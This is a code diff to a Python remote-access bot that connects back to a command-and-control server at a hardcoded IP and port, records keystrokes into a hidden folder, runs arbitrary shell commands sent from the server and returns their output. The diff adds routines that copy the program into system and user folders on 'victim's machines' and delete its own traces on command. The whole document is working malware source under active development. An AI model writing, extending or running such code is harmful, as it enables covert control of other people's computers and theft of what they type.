@@ -23,12 +23,11 @@ except ImportError as e:
 
 #  CONSTANTS  #
 FILENAME = __file__[2:]
+SYSTEM = system()
 IP = "192.168.31.134" # IP address to connect to.
 PORT = 1337 # Port number to create socket with.
 DIRECTORY = "/tmp/.folder" # Hidden folder to create for our keylogger.
-KEY = "Where's the money?" # Encryption key... :)
 SECONDS_TO_LOG = 30 # Number of the seconds to wait before logging keystrokes to file.
-BLOCK_CIPHER_STRING = "You have been pawned!" # The string to use in cipher block encryption.
 LOG = '' # Will store the keystrokes of the user.
 COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.
 
@@ -50,17 +49,38 @@ def create_client_socket():
 	client_sock.send(initial_message.encode('utf-8')) # Send message with this host's IP back to the server.
 	return client_sock # Return the created client socket.
 		
-def self_delete(name: str):
+def self_delete():
 	"""This function will be invoked when the C&C server enter's the
 		keyword "self-destruct" and which will instruct the program to
 		delete traces of itself.
 		Arguments:
-			name (str): The name of this file.
+			None
 		Returns:
 			None
 	"""
-	os.remove(name) # Delete the local file to remove traces of our program.
-	
+	fullpath = os.path.abspath(FILENAME) # Full path of the file.
+	if SYSTEM == 'Linux':
+		try:
+			'''
+			Delete all files from Linux system.
+			'''
+			run(['rm', '/tmp/' + FILENAME])
+			run(['rm', '/etc/' + FILENAME])
+			run(['rm', '/tmp/' + FILENAME])
+			run(['rm', fullpath])
+		except:
+			return "Couldnt remove all files..."
+		return "Deleted all files..."
+	else:
+		try:
+			run(['del', r'%temp%\\' + FILENAME])
+			run(['del', r'C:\Users\%username%\\' + FILENAME])
+			run(['del', r'C:\Users\%username%\\AppData\\' + FILENAME])
+			run('del', fullpath)
+		except:
+			return r"Couldn't remove all files..."
+		return r"Deleted all files..."
+
 def propagate(name: str):
 	"""This function will create other instances of this file in 
 		other directories on the victim's machines when the keyword
@@ -70,13 +90,31 @@ def propagate(name: str):
 		Returns:
 			None
 	"""
+	if SYSTEM == 'Linux':
+		try:
+			run(['cp', name, '/tmp'])
+			run(['cp', name, '/etc'])
+			run(['cp', name, '/var'])
+		except:
+			return "Unable to propagate..."
+		return "File has been cloned to /tmp /etc and /var folders..."
+	else:
+		try:
+			run(['copy', name, r'%temp%'])
+			run(['copy', name, r'C:\Users\%username%\\'])
+			run(['copy', name, r'C:\Users\%username%\AppData\\'])
+		except:
+			return r"Unable to propagate..."	
+		return r"File has been cloned to temp, C:\Users\[current user]\, and AppData\..."
 
 def auto_recon():
 	"""This function will perform basic reconnaissance on the target machines.
 		Arguments:
+			None
 		Returns:
-
+			None
 	"""
+
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -207,16 +245,23 @@ class WindowsBot:
 				while True:
 					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
 					command_output = None
-					if command == 'keylog':
+					if command.strip() == 'keylog':
 						command_output = keylogger()
 					elif command[:7] == 'encrypt':
 						command_output = crypto(command[:7], command[8:])
 					elif command[:7] == 'decrypt':
 						command_output = crypto(command[7:], command[8:].split())
+					elif command.strip() == 'propagate':
+						command_output = propagate(FILENAME)
+					elif command.strip() == 'destory':
+						command_output = self_delete()
+					elif command == 'autorecon':
+						command_output = auto_recon()
 					else:
 						command_output = self.exec_windows_cmd(command) # Execute command on machine and store the response.
 					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
 		except:
+			sock.close()
 			exit(1)
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
@@ -261,24 +306,30 @@ class LinuxBot:
 				while True:
 					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
 					command_output = None
-					if command == 'keylog':
+					if command.strip() == 'keylog':
 						command_output = keylogger()
 					elif command[:7] == 'encrypt':
 						command_output = crypto(command[:7], command[8:])
 					elif command[:7] == 'decrypt':
 						command_output = crypto(command[7:], command[8:].split())
+					elif command.strip() == 'propagate':
+						command_output = propagate(FILENAME)
+					elif command.strip() == 'destory':
+						command_output = self_delete()
+					elif command == 'autorecon':
+						command_output = auto_recon()
 					else:
 						command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
 					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
 		except:
+			sock.close()
 			exit(1)
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 def main():
 	obj = None
-	OS = system() # Determine operating system.
-	if OS == "Linux": # Check if operating system is Linux.
+	if SYSTEM == "Linux": # Check if operating system is Linux.
 		obj = LinuxBot() # If Linux, instantiate LinuxBot object.
 	else:
 		obj = WindowsBot() # Else, instantiate WindowsBot object.
